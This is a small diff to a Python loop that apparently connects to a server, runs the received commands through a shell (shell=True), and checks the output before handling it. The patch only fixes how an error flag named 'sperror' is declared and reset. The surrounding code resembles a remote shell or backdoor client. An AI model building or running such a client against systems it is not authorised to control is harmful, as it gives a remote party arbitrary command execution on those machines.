@@ -70,11 +70,12 @@ while True:
                         print("Failed to connect to server")
                         continue
                 old_command = command
+                global sperror
+                sperror = None
                 try:
                     cmdout = system(command, shell=True).decode()
                 except subprocess.CalledProcessError as e:
                     try:
-                        global sperror
                         sperror=True
                     except KeyboardInterrupt:
                         continue
@@ -98,7 +99,7 @@ while True:
                     except KeyboardInterrupt:
                             continue
                     continue
-
+                old_command = command
                 if not sperror:
                     if cmdout != "":
                         try:
